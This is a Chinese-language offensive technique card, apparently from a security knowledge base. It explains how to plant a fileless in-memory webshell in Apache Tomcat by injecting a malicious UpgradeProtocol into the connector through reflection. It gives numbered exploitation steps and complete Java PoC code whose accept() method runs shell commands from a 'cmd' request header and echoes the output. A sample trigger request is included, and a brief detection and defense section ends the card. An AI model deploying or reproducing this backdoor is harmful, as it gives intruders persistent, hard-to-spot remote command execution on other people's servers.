---
id: web-java-component-tomcat-upgrade-memshell
title: Tomcat Upgrade 内存马：向 httpUpgradeProtocols 注册恶意 UpgradeProtocol
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-upgrade-protocol-memshell
aliases:
- Tomcat Upgrade 内存马
- httpUpgradeProtocols 注入
- UpgradeProtocol.accept 命令执行
- Connection Upgrade 内存马
- Tomcat 协议升级 WebShell
tags:
- java
- tomcat
- memshell
- persistence
- upgrade-protocol
- connector
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:37:09+08:00'
  notes: '已对照原文3.4节核对：RequestFacade→Request→Connector→protocolHandler→httpUpgradeProtocols反射链，注册doctor协议；UpgradeProtocol.accept读取cmd头，反射Request.response后doWrite回显；原文实测首次访问/test/test2后任意路径+Connection: Upgrade/Upgrade: doctor/cmd 触发。原文未给组件受影响版本，未设置affected_versions。未复现。'
---

## 一句话结论

在已能执行一次 Java 代码的 Tomcat 中，反射取得连接器的 `AbstractHttp11Protocol.httpUpgradeProtocols`，注册一个自定义 `UpgradeProtocol`；之后发送带 `Connection: Upgrade` 与自定义 `Upgrade: <name>` 的请求，Tomcat 会在协议升级阶段调用 `accept()`，执行其中读取请求头并写响应的恶意逻辑，形成位于 Connector 层的内存马。

## 原理

- Tomcat 的 HTTP/1.1 连接器支持协议升级（WebSocket 等）：`AbstractHttp11Protocol` 维护 `httpUpgradeProtocols`（`HashMap<String, UpgradeProtocol>`），键为 `Upgrade` 头中的协议名。
- 请求到达后在 `Http11Processor` 解析阶段检查 `Connection: Upgrade` 与 `Upgrade` 头；匹配到已注册协议时调用 `UpgradeProtocol.accept(org.apache.coyote.Request)`。此时尚未创建标准 ServletRequest，因此恶意逻辑直接使用 Coyote 层的 `Request`/`Response`。
- 恶意 `UpgradeProtocol.accept` 可读取 `request.getHeader("cmd")` 执行命令，再反射取 `org.apache.coyote.Request.response` 字段，调用 `Response.doWrite(ByteBuffer)` 把结果写回连接。
- 注入侧通过 `RequestFacade → request (org.apache.catalina.connector.Request) → connector → protocolHandler (AbstractHttp11Protocol) → httpUpgradeProtocols` 的反射链拿到 map，`put` 自定义协议名与实例。
- `accept()` 返回 `false` 表示不完成标准升级；由于匹配发生在 Connector 层，后续请求即使访问任意路径/不存在的 Context 也可触发。

## 触发条件

- 目标为使用 HTTP/1.1 Connector 的 Tomcat（NIO/NIO2 等，`AbstractHttp11Protocol` 子类）；
- 攻击者已能执行一次 Java 代码或 JSP；
- 能取得当前请求对应的 `RequestFacade`/`Request`/`Connector`；
- 攻击者能发送自定义 `Connection: Upgrade` 与 `Upgrade: <name>` 头（通常可直接控制）。

## 利用步骤

1. 通过 JSP 的 `request`（RequestFacade）反射 `request` 字段得到 `org.apache.catalina.connector.Request`。
2. 反射 `connector` 字段得到 `Connector`，再反射 `protocolHandler` 得到 `AbstractHttp11Protocol`。
3. 反射 `httpUpgradeProtocols` 字段得到协议 map。
4. 定义 `UpgradeProtocol` 实现：`accept()` 中读取 `cmd` 头，执行命令并用 `Response.doWrite` 回显；其余方法返回空/`null`。
5. `map.put("doctor", evilUpgrade)` 注册协议名。
6. 发送 `Connection: Upgrade`、`Upgrade: doctor`、`cmd: <命令>` 的请求，任意路径均可触发。
7. 删除植入文件后仍生效，重启 Tomcat 清除。

## PoC

```java
// 核心注入片段（在可执行 Java 的入口中调用）
RequestFacade rf = (RequestFacade) request;
Field rfField = RequestFacade.class.getDeclaredField("request");
rfField.setAccessible(true);
org.apache.catalina.connector.Request real =
    (org.apache.catalina.connector.Request) rfField.get(rf);

Field cf = org.apache.catalina.connector.Request.class.getDeclaredField("connector");
cf.setAccessible(true);
Connector connector = (Connector) cf.get(real);

Field phf = Connector.class.getDeclaredField("protocolHandler");
phf.setAccessible(true);
AbstractHttp11Protocol handler = (AbstractHttp11Protocol) phf.get(connector);

Field upf = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
upf.setAccessible(true);
HashMap<String, UpgradeProtocol> protocols =
    (HashMap<String, UpgradeProtocol>) upf.get(handler);
protocols.put("doctor", new MyUpgrade());
```

```java
// 恶意 UpgradeProtocol
class MyUpgrade implements UpgradeProtocol {
  public String getHttpUpgradeName(boolean b) { return null; }
  public byte[] getAlpnIdentifier() { return new byte[0]; }
  public String getAlpnName() { return null; }
  public Processor getProcessor(SocketWrapperBase<?> s, Adapter a) { return null; }
  public InternalHttpUpgradeHandler getInternalUpgradeHandler(
      SocketWrapperBase<?> s, Adapter a, org.apache.coyote.Request r) { return null; }

  public boolean accept(org.apache.coyote.Request r) {
    try {
      String cmd = r.getHeader("cmd");
      String[] c = System.getProperty("os.name").toLowerCase().contains("win")
          ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
      Process p = new ProcessBuilder(c).start();
      Scanner sc = new Scanner(p.getInputStream(), "GBK").useDelimiter("\\A");
      byte[] out = (sc.hasNext() ? sc.next() : "").getBytes("GBK");
      Field respField = org.apache.coyote.Request.class.getDeclaredField("response");
      respField.setAccessible(true);
      org.apache.coyote.Response resp = (org.apache.coyote.Response) respField.get(r);
      resp.setCharacterEncoding("GBK");
      resp.doWrite(ByteBuffer.wrap(out));
    } catch (Exception ignored) {}
    return false;
  }
}
```

```http
GET /anything HTTP/1.1
Host: target:8080
Connection: Upgrade
Upgrade: doctor
cmd: whoami
```

## 变体与关联

- 变体：协议名可自定义；也可实现 `getInternalUpgradeHandler` 返回自定义 handler，接管升级后的长连接（类似 WebSocket 通道）。
- 变体：Spring Boot 内嵌 Tomcat 场景下，可通过 `TomcatServletWebServerFactory` 的 ConnectorCustomizer 在正常代码中注册，但内存马场景更常用反射直接改 map。
- 关联：[[web-java-component-tomcat-valve-memshell]]、[[web-java-component-tomcat-executor-memshell]]（Connector/容器层内存马）；[[web-java-classloader-websocket-endpoint-memshell]]（WebSocket 端点型）。
- 边界：仅 HTTP/1.1 Connector 支持；Tomcat 版本升级后字段名/类型可能变化；重启后清空；部分反向代理会剥离 `Upgrade` 头。

## 检测与防御

- 检测：运行期 `httpUpgradeProtocols` 出现非内置协议名；请求中出现 `Connection: Upgrade` + 自定义 `Upgrade` + 命令头特征；Connector 层异常 `doWrite` 调用。
- 处置：重启 Tomcat；内存 dump 枚举 `AbstractHttp11Protocol.httpUpgradeProtocols`。
- 防御：封堵任意代码执行入口；RASP 监控 `httpUpgradeProtocols.put` 与 `UpgradeProtocol` 动态实现；在反向代理层限制未知 `Upgrade` 协议。
